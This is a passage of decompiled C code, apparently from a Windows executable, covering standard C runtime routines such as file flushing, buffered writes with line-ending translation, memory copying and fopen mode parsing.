        // 0x401e7a
        return result;
    }
    // 0x401e5d
    int32_t v1; // bp-8, 0x401e4c
    int32_t v2 = &v1; // 0x401e4d
    int32_t v3 = result;
    *(int32_t *)(v2 - 4) = a2;
    *(int32_t *)(v2 - 8) = *(int32_t *)(v2 + 20);
    *(int32_t *)(v2 - 12) = *(int32_t *)(v2 + 12);
    int32_t v4 = function_401e17((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x401e66
    int32_t result2 = v4; // 0x401e71
    while (*(int32_t *)a2 != -1) {
        // 0x401e73
        v3--;
        result2 = v3;
        if (v3 >= 0 != v3 != 0) {
            // break -> 0x401e7a
            break;
        }
        *(int32_t *)(v2 - 4) = a2;
        *(int32_t *)(v2 - 8) = *(int32_t *)(v2 + 20);
        *(int32_t *)(v2 - 12) = *(int32_t *)(v2 + 12);
        v4 = function_401e17((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
        result2 = v4;
    }
    // 0x401e7a
    return result2;
}

// Address range: 0x401e7d - 0x401eb5
int32_t function_401e7d(int32_t a1, int32_t result, int32_t a3) {
    // 0x401e7d
    if (result < 1) {
        // 0x401eb1
        return result;
    }
    // 0x401e93
    int32_t v1; // bp-12, 0x401e7d
    int32_t v2 = &v1; // 0x401e86
    int32_t v3 = result;
    int32_t v4 = a1; // 0x401e7d
    *(int32_t *)(v2 - 4) = a3;
    *(int32_t *)(v2 - 8) = *(int32_t *)(v2 + 24);
    *(int32_t *)(v2 - 12) = (int32_t)*(char *)v4;
    int32_t v5 = function_401e17((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x401e9d
    int32_t result2 = v5; // 0x401ea8
    while (*(int32_t *)a3 != -1) {
        // 0x401eaa
        v3--;
        v4++;
        result2 = v3;
        if (v3 >= 0 != v3 != 0) {
            // break -> 0x401eb1
            break;
        }
        *(int32_t *)(v2 - 4) = a3;
        *(int32_t *)(v2 - 8) = *(int32_t *)(v2 + 24);
        *(int32_t *)(v2 - 12) = (int32_t)*(char *)v4;
        v5 = function_401e17((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
        result2 = v5;
    }
    // 0x401eb1
    return result2;
}

// Address range: 0x401eb5 - 0x401ec2
int32_t function_401eb5(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x401eb9
    int32_t v2 = *v1; // 0x401eb9
    *v1 = v2 + 4;
    return *(int32_t *)v2;
}

// Address range: 0x401ec2 - 0x401ed2
int32_t function_401ec2(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x401ec6
    int32_t v2 = *v1; // 0x401ec6
    *v1 = v2 + 8;
    return *(int32_t *)v2;
}

// Address range: 0x401ed2 - 0x401ee0
int32_t function_401ed2(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x401ed6
    int32_t v2 = *v1; // 0x401ed6
    int32_t v3 = v2 + 4; // 0x401ed6
    *v1 = v3;
    return v3 & -0x10000 | (int32_t)*(int16_t *)v2;
}

// Address range: 0x401ee0 - 0x401f85
int32_t function_401ee0(void) {
    int32_t v1 = g105; // 0x401ee0
    int32_t v2 = 512; // 0x401eeb
    int32_t v3; // 0x401ee0
    if (v1 != 0) {
        // 0x401ef4
        v2 = 20;
        v3 = v1;
        if (v1 < 20) {
            goto lab_0x401efa;
        } else {
            goto lab_0x401eff;
        }
    } else {
        goto lab_0x401efa;
    }
  lab_0x401efa:
    // 0x401efa
    g105 = v2;
    v3 = v2;
    goto lab_0x401eff;
  lab_0x401eff:;
    int32_t v4 = function_403a15(v3, 4); // 0x401f02
    g103 = v4;
    if (v4 == 0) {
        // 0x401f12
        g105 = 20;
        int32_t v5 = function_403a15(20, 4); // 0x401f1b
        g103 = v5;
        if (v5 == 0) {
            // 0x401f2b
            __amsg_exit();
        }
    }
    int32_t v6 = (int32_t)&g16; // 0x401f35
    int32_t v7 = 0; // 0x401f35
    *(int32_t *)(g103 + v7) = v6;
    int32_t v8 = v6 + 32; // 0x401f43
    v6 = v8;
    v7 += 4;
    int32_t v9 = 0; // 0x401f4e
    while (v8 < (int32_t)&g21) {
        // 0x401f3a
        *(int32_t *)(g103 + v7) = v6;
        v8 = v6 + 32;
        v6 = v8;
        v7 += 4;
        v9 = 0;
    }
    int32_t v10 = &g17;
    int32_t v11 = *(int32_t *)(4 * v9 / 32 + (int32_t)&g96); // 0x401f61
    int32_t result = *(int32_t *)((8 * v9 & 248) + v11); // 0x401f68
    if (result != -1 != result != 0) {
        // 0x401f74
        *(int32_t *)v10 = -1;
    }
    int32_t v12 = v10 + 32; // 0x401f77
    v9++;
    while (v12 < (int32_t)&g20) {
        // 0x401f57
        v10 = v12;
        v11 = *(int32_t *)(4 * v9 / 32 + (int32_t)&g96);
        result = *(int32_t *)((8 * v9 & 248) + v11);
        if (result != -1 != result != 0) {
            // 0x401f74
            *(int32_t *)v10 = -1;
        }
        // 0x401f77
        v12 = v10 + 32;
        v9++;
    }
    // 0x401f83
    return result;
}

// Address range: 0x401f85 - 0x401f99
int32_t function_401f85(void) {
    int32_t result = function_402177(); // 0x401f85
    if (g61 == 0) {
        // 0x401f98
        return result;
    }
    // 0x401f93
    return function_403ac6();
}

// Address range: 0x401f99 - 0x402002
int32_t function_401f99(int32_t lpMem) {
    int32_t v1 = lpMem;
    if (lpMem == 0) {
        // 0x401fff
        int32_t result; // 0x401f99
        return result;
    }
    // 0x401fa5
    int32_t v2; // 0x401f99
    int32_t v3; // 0x401f99
    int32_t v4; // 0x401f99
    if (g95 == 3) {
        int32_t v5 = function_403b66(lpMem, v2, v4, v3); // 0x401fb0
        if (v5 == 0) {
            // 0x401fff
            return HeapFree((int32_t *)g94, 0, (int32_t *)lpMem);
        }
        // 0x401fff
        return function_403b91(v5, lpMem);
    }
    if (g95 != 2) {
        // 0x401fff
        return HeapFree((int32_t *)g94, 0, (int32_t *)lpMem);
    }
    // 0x401fca
    int32_t v6; // bp-8, 0x401f99
    int32_t v7 = function_4045cb(lpMem, &v6, &v1, v2, v4, v3); // 0x401fd3
    if (v7 == 0) {
        // 0x401fff
        return HeapFree((int32_t *)g94, 0, (int32_t *)lpMem);
    }
    // 0x401fff
    return function_404622(v6, v1, v7);
}

// Address range: 0x402002 - 0x4020b5
int32_t function_402002(int32_t a1) {
    // 0x402002
    if ((int32_t)g98 <= a1) {
        // 0x40209c
        g50 = 0;
        g49 = 9;
        // 0x4020b0
        return -1;
    }
    int32_t * v1 = (int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x40202a
    int32_t v2 = 8 * a1 & 248 | 4;
    if ((*(char *)(*v1 + v2) & 1) == 0) {
        // 0x40209c
        g50 = 0;
        g49 = 9;
        // 0x4020b0
        return -1;
    }
    // 0x402033
    int32_t v3; // bp-16, 0x402002
    int32_t v4 = &v3; // 0x402005
    int32_t v5 = a1; // bp-20, 0x402033
    int32_t v6 = v4; // 0x40203d
    int32_t errorCode = 0; // 0x40203d
    if (function_404b80(a1) == -1) {
        goto lab_0x40207d;
    } else {
        if (a1 != 1 == (a1 != 2)) {
            goto lab_0x40205f;
        } else {
            // 0x402049
            v5 = 2;
            int32_t v7 = function_404b80(2); // 0x40204b
            v6 = v4;
            errorCode = 0;
            if (function_404b80(1) == v7) {
                goto lab_0x40207d;
            } else {
                goto lab_0x40205f;
            }
        }
    }
  lab_0x40207d:;
    int32_t * v8 = (int32_t *)(v6 - 4); // 0x40207d
    *v8 = a1;
    function_404b06((int32_t)&g110);
    *(char *)(*v1 + v2) = 0;
    int32_t result = 0; // 0x40208d
    if (errorCode != 0) {
        // 0x40208f
        *v8 = errorCode;
        function_404993((int32_t)&g110);
        result = -1;
    }
    // 0x4020b0
    return result;
  lab_0x40205f:;
    int32_t hObject = function_404b80(a1); // 0x402060
    v5 = hObject;
    int32_t v9 = &v5; // 0x402066
    v6 = v9;
    errorCode = 0;
    if (!CloseHandle((int32_t *)hObject)) {
        // 0x402071
        v6 = v9;
        errorCode = GetLastError();
    }
    goto lab_0x40207d;
}

// Address range: 0x4020b5 - 0x4020e0
int32_t function_4020b5(int32_t a1) {
    int32_t v1 = a1 + 12; // 0x4020ba
    int32_t v2 = *(int32_t *)v1; // 0x4020ba
    int32_t result = v2; // 0x4020bf
    if ((v2 & 131) != 0 && (v2 & 8) != 0) {
        int32_t * v3 = (int32_t *)(a1 + 8); // 0x4020c5
        function_401f99(*v3);
        int16_t * v4 = (int16_t *)v1; // 0x4020cd
        *v4 = *v4 & -1033;
        *(int32_t *)a1 = 0;
        *v3 = 0;
        *(int32_t *)(a1 + 4) = 0;
        result = 0;
    }
    // 0x4020de
    return result;
}

// Address range: 0x4020e0 - 0x40211b
int32_t _fflush(int32_t a1) {
    if (a1 == 0) {
        // 0x4020e9
        return _flsall(a1);
    }
    // 0x4020f2
    if (function_40211b(a1) != 0) {
        // 0x4020fd
        return -1;
    }
    // 0x402102
    if ((*(char *)(a1 + 13) & 64) == 0) {
        // 0x4020fd
        return 0;
    }
    // 0x402108
    return function_404bbd(*(int32_t *)(a1 + 16)) != 0;
}

// Address range: 0x40211b - 0x402177
int32_t function_40211b(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x402124
    int32_t v2 = *v1; // 0x402124
    int32_t * v3 = (int32_t *)(a1 + 8);
    int32_t * v4; // 0x40211b
    int32_t result; // 0x40211b
    if ((v2 & 264) == 0 || (v2 & 3) != 2) {
        // 0x40211b
        v4 = (int32_t *)a1;
        result = 0;
    } else {
        int32_t v5 = *v3; // 0x402137
        int32_t * v6 = (int32_t *)a1;
        uint32_t v7 = *v6 - v5; // 0x40213c
        v4 = v6;
        result = 0;
        if (v7 >= 1) {
            int32_t v8 = function_402302(*(int32_t *)(a1 + 16), v5, v7); // 0x402147
            int32_t v9 = *v1;
            if (v8 != v7) {
                // 0x402161
                *v1 = v9 | 32;
                v4 = v6;
                result = -1;
            } else {
                // 0x402153
                v4 = v6;
                result = 0;
                if ((char)v9 <= 255) {
                    // 0x40215a
                    *v1 = v9 & -3;
                    v4 = v6;
                    result = 0;
                }
            }
        }
    }
    // 0x402168
    *(int32_t *)(a1 + 4) = 0;
    *v4 = *v3;
    return result;
}

// Address range: 0x402177 - 0x402180
int32_t function_402177(void) {
    // 0x402177
    return _flsall(1);
}

// Address range: 0x4021ed - 0x402302
int32_t function_4021ed(int32_t a1, int32_t a2) {
    int32_t v1 = 0x1000000 * a1 / 0x1000000;
    int32_t v2 = a2 + 12; // 0x4021f5
    int32_t * v3 = (int32_t *)v2; // 0x4021f5
    int32_t v4 = *v3; // 0x4021f5
    if ((v4 & 130) == 0) {
        // 0x4022f6
        *v3 = v4 | 32;
        // 0x4022fe
        return -1;
    }
    if ((v4 & 64) != 0) {
        // 0x4022f6
        *v3 = v4 | 32;
        // 0x4022fe
        return -1;
    }
    int32_t v5 = *(int32_t *)(a2 + 16); // 0x4021f8
    int32_t * v6 = (int32_t *)(a2 + 4);
    int32_t v7 = v4; // 0x40220d
    if ((v4 & 1) != 0) {
        // 0x40220f
        *v6 = 0;
        if ((v4 & 16) == 0) {
            // 0x4022f6
            *v3 = v4 | 32;
            // 0x4022fe
            return -1;
        }
        // 0x40221b
        v7 = v4 & -2;
        *(int32_t *)a2 = *(int32_t *)(a2 + 8);
        *v3 = v7;
    }
    // 0x402225
    *v6 = 0;
    *v3 = v7 & -19 | 2;
    if ((v7 & 268) != 0) {
        goto lab_0x40225f;
    } else {
        if (a2 != (int32_t)&g18 == (a2 != (int32_t)&g19)) {
            // 0x402258
            function_404cae(a2);
            goto lab_0x40225f;
        } else {
            // 0x40224d
            int32_t v8; // 0x4021ed
            if (function_403816(v5, v8) != 0) {
                goto lab_0x40225f;
            } else {
                // 0x402258
                function_404cae(a2);
                goto lab_0x40225f;
            }
        }
    }
  lab_0x40225f:;
    // 0x40225f
    int32_t v9; // 0x4021ed
    int32_t v10; // 0x4021ed
    if ((*(int16_t *)v2 & 264) == 0) {
        // 0x4022cc
        v10 = function_402302(v5, (int32_t)&v1, 1);
        v9 = 1;
    } else {
        int32_t * v11 = (int32_t *)(a2 + 8); // 0x402268
        int32_t v12 = *v11; // 0x402268
        int32_t * v13 = (int32_t *)a2; // 0x40226b
        int32_t v14 = *v13 - v12; // 0x40226d
        *v13 = v12 + 1;
        *v6 = *(int32_t *)(a2 + 24) - 1;
        int32_t v15; // 0x4021ed
        if (v14 < 1) {
            int32_t v16 = &g27; // 0x402292
            if (v5 != -1) {
                int32_t v17 = *(int32_t *)(4 * v5 / 32 + (int32_t)&g96); // 0x40229e
                v16 = v17 + (8 * v5 & 248);
            }
            // 0x4022af
            v15 = 0;
            if ((*(char *)(v16 + 4) & 32) != 0) {
                // 0x4022b5
                function_404c14(v5, 0, 2);
                v15 = 0;
            }
        } else {
            // 0x40227f
            v15 = function_402302(v5, v12, v14);
        }
        // 0x4022c2
        *(char *)*v11 = (char)v1;
        v10 = v15;
        v9 = v14;
    }
    // 0x4022e0
    int32_t result; // 0x4021ed
    if (v10 == v9) {
        // 0x4022ec
        result = v1 & 255;
    } else {
        // 0x4022e6
        *v3 = *v3 | 32;
        result = -1;
    }
    // 0x4022fe
    return result;
}

// Address range: 0x402302 - 0x4024af
int32_t function_402302(uint32_t a1, int32_t lpBuffer, uint32_t nNumberOfBytesToWrite) {
    // 0x402302
    if ((int32_t)g98 <= a1) {
        // 0x402496
        g50 = 0;
        g49 = 9;
        // 0x4024aa
        return -1;
    }
    int32_t v1 = 8 * a1 & 248; // 0x40232e
    int32_t * v2 = (int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x402331
    int32_t v3 = *v2; // 0x402331
    int32_t v4 = v1 | 4;
    char v5 = *(char *)(v3 + v4); // 0x402333
    if ((v5 & 1) == 0) {
        // 0x402496
        g50 = 0;
        g49 = 9;
        // 0x4024aa
        return -1;
    }
    // 0x40233f
    if (nNumberOfBytesToWrite == 0) {
        // 0x4024aa
        return 0;
    }
    int32_t v6 = v3; // 0x402355
    if ((v5 & 32) != 0) {
        // 0x402357
        function_404c14(a1, 0, 2);
        v6 = *v2;
    }
    int32_t v7 = v6 + v1; // 0x402365
    int32_t v8; // 0x402302
    int32_t v9; // 0x402302
    int32_t errorCode; // 0x402302
    int32_t errorCode2; // 0x402302
    int32_t v10; // 0x402302
    int32_t lpNumberOfBytesWritten; // bp-16, 0x402302
    int32_t v11; // 0x402302
    if (*(char *)(v7 + 4) > -1) {
        int32_t hFile = *(int32_t *)v7; // 0x40243d
        int32_t v12 = hFile; // bp-1080, 0x40243d
        int32_t v13 = &v12; // 0x40243d
        if (!WriteFile((int32_t *)hFile, (int32_t *)lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL)) {
            // 0x4023fb
            v8 = v13;
            errorCode = GetLastError();
            goto lab_0x402406;
        } else {
            // 0x402449
            v10 = lpNumberOfBytesWritten;
            v11 = 0;
            errorCode2 = 0;
            v9 = v13;
            goto lab_0x4023fb;
        }
    } else {
        // 0x402383
        int32_t v14; // bp-1048, 0x402302
        int32_t v15 = &v14; // 0x402383
        int32_t v16 = 0; // 0x4023e7
        int32_t v17 = 0; // 0x402302
        int32_t v18 = lpBuffer;
        int32_t v19; // bp-1060, 0x402302
        int32_t v20 = &v19; // 0x402302
        int32_t v21; // 0x402302
        int32_t v22; // 0x402302
        int32_t v23; // 0x4023d7
        while (true) {
            // 0x402383
            v21 = v16;
            int32_t v24 = v15;
            int32_t v25 = v18;
            int32_t v26 = v17;
            int32_t v27; // 0x402302
            int32_t v28; // 0x402302
            int32_t v29; // 0x402302
            while (v25 - lpBuffer < nNumberOfBytesToWrite) {
                char v30 = *(char *)v25; // 0x40239a
                int32_t v31 = v26; // 0x40239f
                int32_t v32 = v24; // 0x40239f
                if (v30 == 10) {
                    // 0x4023a1
                    *(char *)v24 = 13;
                    v31 = v26 + 1;
                    v32 = v24 + 1;
                }
                int32_t v33 = v25 + 1; // 0x402397
                int32_t v34 = v31;
                *(char *)v32 = v30;
                int32_t v35 = v32 + 1; // 0x4023aa
                int32_t v36 = v35 - v15;
                v27 = v36;
                v28 = v34;
                v29 = v33;
                if (v36 >= 1024) {
                    goto lab_0x4023bd;
                }
                v24 = v35;
                v25 = v33;
                v26 = v34;
            }
            // 0x402389
            v27 = v24 - v15;
            v28 = v26;
            v29 = v25;
          lab_0x4023bd:
            // 0x4023bd
            v18 = v29;
            v22 = v28;
            *(int32_t *)(v20 - 4) = 0;
            *(int32_t *)(v20 - 8) = (int32_t)&lpNumberOfBytesWritten;
            *(int32_t *)(v20 - 12) = v27;
            *(int32_t *)(v20 - 16) = v15;
            v23 = v20 - 20;
            *(int32_t *)v23 = *(int32_t *)(*v2 + v1);
            if (!WriteFile(&g110, &g110, (int32_t)&g110, &g110, (struct _OVERLAPPED *)&g110)) {
                // break -> 0x402427
                break;
            }
            // 0x4023e4
            v16 = lpNumberOfBytesWritten + v21;
            v17 = v22;
            v20 = v23;
            v10 = v16;
            v11 = v22;
            errorCode2 = 0;
            v9 = v23;
            if (v18 - lpBuffer < nNumberOfBytesToWrite != lpNumberOfBytesWritten >= v27) {
                goto lab_0x4023fb;
            }
        }
        // 0x402427
        v10 = v21;
        v11 = v22;
        errorCode2 = GetLastError();
        v9 = v23;
        goto lab_0x4023fb;
    }
  lab_0x4023fb:
    // 0x4023fb
    v8 = v9;
    errorCode = errorCode2;
    if (v10 != 0) {
        // 0x4024aa
        return v10 - v11;
    }
    goto lab_0x402406;
  lab_0x402406:
    // 0x402406
    if (errorCode == 0) {
        // 0x40246a
        if ((*(char *)(*v2 + v4) & 64) != 0) {
            // 0x402473
            if (*(char *)lpBuffer == 26) {
                // 0x4024aa
                return 0;
            }
        }
        // 0x40247f
        g49 = 28;
        g50 = 0;
        // 0x4024aa
        return -1;
    }
    int32_t * v37 = (int32_t *)(v8 - 4); // 0x40240b
    *v37 = 5;
    if (errorCode != 5) {
        // 0x40245f
        *v37 = errorCode;
        function_404993((int32_t)&g110);
    } else {
        // 0x402413
        g49 = 9;
        g50 = 5;
    }
    // 0x4024aa
    return -1;
}

// Address range: 0x4024b0 - 0x4027e5
int32_t function_4024b0(int32_t result5, uint32_t a2, uint32_t a3) {
    int32_t result3 = a3 + a2; // 0x4024c2
    int32_t v1; // 0x4024b0
    int32_t v2; // 0x4024b0
    int32_t v3; // 0x4024b0
    int32_t v4; // 0x4024b0
    int32_t v5; // 0x4024b0
    int32_t result6; // 0x4024b0
    int32_t v6; // 0x4024b0
    int32_t v7; // 0x4024b0
    int32_t v8; // 0x4024b0
    int32_t v9; // 0x4024b0
    int32_t v10; // 0x4024b0
    int32_t v11; // 0x4024b0
    int32_t result2; // 0x4024b0
    int32_t result; // 0x4024b0
    if (result5 > a2 == result3 > result5) {
        int32_t v12 = a3 - 4; // 0x402648
        int32_t v13 = v12 + a2; // 0x402648
        int32_t v14 = v12 + result5; // 0x40264c
        int32_t v15 = v14 & 3; // 0x402650
        if (v15 != 0) {
            // 0x40267c
            g115 = a3;
            result2 = v15;
            result = result5;
            v9 = v13;
            v6 = v14;
            v10 = v13;
            v7 = v14;
            v11 = v13;
            v8 = v14;
            switch (a3) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x4027a8;
                }
                case 2: {
                    goto lab_0x4027b8;
                }
                case 3: {
                    goto lab_0x4027cc;
                }
                default: {
                    return result2;
                }
            }
        } else {
            int32_t v16 = -((a3 / 4));
            g114 = v16;
            if (a3 < 4) {
                // 0x4024f8
                return result3;
            }
            int32_t v17 = a3 & 3; // 0x40265b
            __asm_rep_movsd_memcpy((char *)v14, (char *)v13, v16);
            int32_t v18 = v14 + (a3 & -4); // 0x402664
            g113 = v17;
            result = result5;
            v9 = v18;
            v6 = v18;
            v10 = v18;
            v7 = v18;
            v11 = v18;
            v8 = v18;
            switch (v17) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x4027a8;
                }
                case 2: {
                    goto lab_0x4027b8;
                }
                case 3: {
                    goto lab_0x4027cc;
                }
                default: {
                    // 0x4026702
                    // UNREACHABLE
                }
            }
        }
    } else {
        int32_t result4 = result5 & 3; // 0x4024d0
        if (result4 != 0) {
            // 0x4024ec
            result = result5;
            if (a3 >= 4) {
                // 0x4024f8
                return result4;
            }
            // 0x4024f8
            return result;
        }
        int32_t v19 = a3 / 4; // 0x4024d8
        g112 = v19;
        result = result3;
        switch (v19) {
            case 0: {
                return result;
            }
            case 1: {
                // 0x4024d8
                result6 = a3 & -4;
                goto lab_0x4025dc;
            }
            case 2: {
                // 0x4024d8
                v3 = a3 & -4;
                goto lab_0x4025d4;
            }
            case 3: {
                // 0x4024d8
                v4 = a3 & -4;
                goto lab_0x4025cc;
            }
            case 4: {
                // 0x4024d8
                v5 = a3 & -4;
                goto lab_0x4025c4;
            }
            case 5: {
                // 0x4024d8
                v1 = a3 & -4;
                goto lab_0x4025bc;
            }
            case 6: {
                // 0x4024d8
                v2 = a3 & -4;
                goto lab_0x4025b4;
            }
            case 7: {
                int32_t v20 = a3 & -4;
                int32_t v21 = v20 - 28;
                *(int32_t *)(v21 + result5) = *(int32_t *)(v21 + a2);
                v2 = v20;
                goto lab_0x4025b4;
            }
            default: {
                int32_t v22 = a3 & 3; // 0x4024db
                __asm_rep_movsd_memcpy((char *)result5, (char *)a2, v19);
                g111 = v22;
                result2 = result5;
                if (v22 < 2) {
                    // 0x4024f8
                    return result5;
                }
                // 0x4024f8
                return result2;
            }
        }
    }
  lab_0x4027a8:
    // 0x4027a8
    *(char *)(v6 + 3) = *(char *)(v9 + 3);
    return result5;
  lab_0x4027b8:
    // 0x4027b8
    *(char *)(v7 + 3) = *(char *)(v10 + 3);
    *(char *)(v7 + 2) = *(char *)(v10 + 2);
    return result5;
  lab_0x4027cc:
    // 0x4027cc
    *(char *)(v8 + 3) = *(char *)(v11 + 3);
    *(char *)(v8 + 2) = *(char *)(v11 + 2);
    *(char *)(v8 + 1) = *(char *)(v11 + 1);
    return result5;
  lab_0x4025dc:;
    int32_t v23 = result6 - 4;
    *(int32_t *)(v23 + result5) = *(int32_t *)(v23 + a2);
    // 0x4024f8
    return result6;
  lab_0x4025d4:;
    int32_t v24 = v3 - 8;
    *(int32_t *)(v24 + result5) = *(int32_t *)(v24 + a2);
    result6 = v3;
    goto lab_0x4025dc;
  lab_0x4025cc:;
    int32_t v25 = v4 - 12;
    *(int32_t *)(v25 + result5) = *(int32_t *)(v25 + a2);
    v3 = v4;
    goto lab_0x4025d4;
  lab_0x4025c4:;
    int32_t v26 = v5 - 16;
    *(int32_t *)(v26 + result5) = *(int32_t *)(v26 + a2);
    v4 = v5;
    goto lab_0x4025cc;
  lab_0x4025bc:;
    int32_t v27 = v1 - 20;
    *(int32_t *)(v27 + result5) = *(int32_t *)(v27 + a2);
    v5 = v1;
    goto lab_0x4025c4;
  lab_0x4025b4:;
    int32_t v28 = v2 - 24;
    *(int32_t *)(v28 + result5) = *(int32_t *)(v28 + a2);
    v1 = v2;
    goto lab_0x4025bc;
}

// Address range: 0x4027e5 - 0x402955
int32_t function_4027e5(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    char v1 = *(char *)a2; // 0x4027fe
    int32_t v2 = 265; // 0x4027e5
    int32_t v3; // 0x4027e5
    int32_t v4; // 0x4027e5
    switch (v1) {
        case 114: {
            // 0x402817
            v3 = 0;
            v4 = g68 | 1;
            // break -> 0x402826
            break;
        }
        default: {
            // 0x402808
            v2 = 769;
            if (v1 != 119) {
                // 0x402950
                return 0;
            }
        }
        case 97: {
            // 0x402823
            v3 = v2;
            v4 = g68 | 2;
            // break -> 0x402826
            break;
        }
    }
    int32_t v5 = a2 + 1; // 0x402829
    char v6 = *(char *)v5; // 0x402829
    int32_t v7 = v5; // 0x40282f
    int32_t v8 = 0; // 0x40282f
    int32_t v9 = 0; // 0x40282f
    int32_t v10 = v3; // 0x40282f
    int32_t v11 = v4; // 0x40282f
    if (v6 != 0) {
        int32_t v12 = v9;
        int32_t v13 = v8;
        int32_t v14; // 0x4027e5
        int32_t v15; // 0x4027e5
        if (v6 > 84) {
            switch (v6) {
                case 98: {
                    // 0x402904
                    if ((v3 & 0xc000) != 0) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x402910
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 | 0x8000;
                    v15 = v4;
                    // break -> 0x402829
                    break;
                }
                case 99: {
                    // 0x4028ed
                    if (v12 != 0) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x4028f2
                    v9 = 1;
                    v8 = v13;
                    v14 = v3;
                    v15 = v4 | 0x4000;
                    // break -> 0x402829
                    break;
                }
                case 110: {
                    // 0x4028d6
                    if (v12 != 0) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x4028db
                    v9 = 1;
                    v8 = v13;
                    v14 = v3;
                    v15 = v4 & -0x4001;
                    // break -> 0x402829
                    break;
                }
                default: {
                    // 0x4028c4
                    if (v6 != 116) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x4028c9
                    if ((v3 & 0xc000) != 0) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x4028ce
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 | 0x4000;
                    v15 = v4;
                    // break -> 0x402829
                    break;
                }
            }
        } else {
            switch (v6) {
                case 84: {
                    // 0x4028a7
                    if ((v3 & 0x1000) != 0) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x4028b0
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 | 0x1000;
                    v15 = v4;
                    // break -> 0x402829
                    break;
                }
                case 43: {
                    // 0x402891
                    if ((v3 & 2) != 0) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x402896
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 & -4 | 2;
                    v15 = v4 & -132 | 128;
                    // break -> 0x402829
                    break;
                }
                case 68: {
                    // 0x402887
                    if ((v3 & 64) != 0) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x40288c
                    v9 = v12;
                    v8 = v13;
                    v14 = v3 | 64;
                    v15 = v4;
                    // break -> 0x402829
                    break;
                }
                case 82: {
                    // 0x402872
                    if (v13 != 0) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x40287b
                    v9 = v12;
                    v8 = 1;
                    v14 = v3 | 16;
                    v15 = v4;
                    // break -> 0x402829
                    break;
                }
                default: {
                    // 0x402856
                    if (v6 == 83 != (v13 == 0)) {
                        // break -> 0x402918
                        break;
                    }
                    // 0x402866
                    v9 = v12;
                    v8 = 1;
                    v14 = v3 | 32;
                    v15 = v4;
                    // break -> 0x402829
                    break;
                }
            }
        }
        int32_t v16 = v15;
        int32_t v17 = v14;
        v7++;
        char v18 = *(char *)v7; // 0x402829
        v10 = v17;
        v11 = v16;
        while (v18 != 0) {
            // 0x40283d
            v12 = v9;
            v13 = v8;
            int32_t v19 = v17;
            int32_t v20 = v16;
            char v21 = v18;
            if (v21 > 84) {
                switch (v21) {
                    case 98: {
                        // 0x402904
                        if ((v19 & 0xc000) != 0) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x402910
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 | 0x8000;
                        v15 = v20;
                        // break -> 0x402829
                        break;
                    }
                    case 99: {
                        // 0x4028ed
                        if (v12 != 0) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x4028f2
                        v9 = 1;
                        v8 = v13;
                        v14 = v19;
                        v15 = v20 | 0x4000;
                        // break -> 0x402829
                        break;
                    }
                    case 110: {
                        // 0x4028d6
                        if (v12 != 0) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x4028db
                        v9 = 1;
                        v8 = v13;
                        v14 = v19;
                        v15 = v20 & -0x4001;
                        // break -> 0x402829
                        break;
                    }
                    default: {
                        // 0x4028c4
                        if (v21 != 116) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x4028c9
                        if ((v19 & 0xc000) != 0) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x4028ce
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 | 0x4000;
                        v15 = v20;
                        // break -> 0x402829
                        break;
                    }
                }
            } else {
                switch (v21) {
                    case 84: {
                        // 0x4028a7
                        if ((v19 & 0x1000) != 0) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x4028b0
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 | 0x1000;
                        v15 = v20;
                        // break -> 0x402829
                        break;
                    }
                    case 43: {
                        // 0x402891
                        if ((v19 & 2) != 0) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x402896
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 & -4 | 2;
                        v15 = v20 & -132 | 128;
                        // break -> 0x402829
                        break;
                    }
                    case 68: {
                        // 0x402887
                        if ((v19 & 64) != 0) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x40288c
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 | 64;
                        v15 = v20;
                        // break -> 0x402829
                        break;
                    }
                    case 82: {
                        // 0x402872
                        if (v13 != 0) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x40287b
                        v9 = v12;
                        v8 = 1;
                        v14 = v19 | 16;
                        v15 = v20;
                        // break -> 0x402829
                        break;
                    }
                    default: {
                        // 0x402856
                        if (v21 == 83 != (v13 == 0)) {
                            // break -> 0x402918
                            break;
                        }
                        // 0x402866
                        v9 = v12;
                        v8 = 1;
                        v14 = v19 | 32;
                        v15 = v20;
                        // break -> 0x402829
                        break;
                    }
                }
            }
            // 0x402829
            v16 = v15;
            v17 = v14;
            v7++;
            v18 = *(char *)v7;
            v10 = v17;
            v11 = v16;
        }
    }
    uint32_t v22 = function_404cf2(a1, v10, a3, 420, (int32_t)&g110); // 0x402924
    int32_t result = 0; // 0x402930
    if (v22 >= 0) {
        // 0x402936
